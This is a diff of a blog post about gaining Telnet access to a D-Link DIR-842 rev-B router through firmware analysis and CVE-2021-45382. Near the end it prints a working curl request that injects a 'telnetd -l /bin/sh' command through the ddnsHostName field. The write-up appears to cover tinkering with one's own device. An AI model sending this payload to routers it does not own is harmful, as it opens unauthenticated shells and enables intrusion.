@@ -22,16 +22,17 @@ image = "cover.png"
 
 +++
 
-
 In this quick blog post we'll see how to enable Telnet on your DIR-842 rev-b
-<!--more-->
 
+<!--more-->
 
 # Some background
 
-There are known vulnerabilities on D-Link's DIR-842, but they are about the [rev-C models](https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10184).
+There are known vulnerabilities on D-Link's DIR-842, but they are about the
+[rev-C models](https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10184).
 
-The rev-B are running a different portal AFAIK, and no exploit for code execution was found during research.
+The rev-B are running a different portal AFAIK, and no exploit for code
+execution was found during research.
 
 ## A first portscan
 
@@ -54,7 +55,8 @@ Other than the usual web interface nothing special to see.
 
 As usual `binwalk` is used on the last firmware.
 
-We're looking for web files and endpoints not mentioned in the web interface itself.
+We're looking for web files and endpoints not mentioned in the web interface
+itself.
 
 The first candidate we found was
 
@@ -64,7 +66,7 @@ The first candidate we found was
 
 This feature shouldn't be present as the device has no USB ports whatsoever.
 
-*So we enabled it :)*
+_So we enabled it :)_
 
 ## Exploring SharePort
 
@@ -88,16 +90,20 @@ A new port has been opened, revealing another interface :
 
 ![Home](/dlink/dir-842-shareport-open.png)
 
-Adding users and trying them doesn't bring any results as most requests are not implemented.
+Adding users and trying them doesn't bring any results as most requests are not
+implemented.
 
 ## Switching to CVE-2021-45382
 
-What is familiar though, is the call to `misc.ccp`, which is made on that portal's login page.
+What is familiar though, is the call to `misc.ccp`, which is made on that
+portal's login page.
 
-A quick research dig bring up a result for this specific D-Link portal, where `ddns_check.ccp` is vulnerable to
-command injection.
+A quick research dig bring up a result for this specific D-Link portal, where
+`ddns_check.ccp` is vulnerable to command injection.
 
-Kudos to [eh-easyhacks](https://eh-easyhacks.blogspot.com/2022/04/cve-2021-45382.html) for the details on the CVE !
+Kudos to
+[eh-easyhacks](https://eh-easyhacks.blogspot.com/2022/04/cve-2021-45382.html)
+for the details on the CVE !
 
 You're going to need :
 
@@ -111,7 +117,6 @@ curl -kv 'http://192.168.240.1/ddns_check.ccp' \
   -H 'Referer: http://192.168.240.1:8181/login.asp' \
   --data-raw 'ccp_act=doCheck&ddnsHostName=;telnetd -l /bin/sh;&ddnsUsername=a&ddnsPassword=b'
 ```
-
 
 ## Voila
 
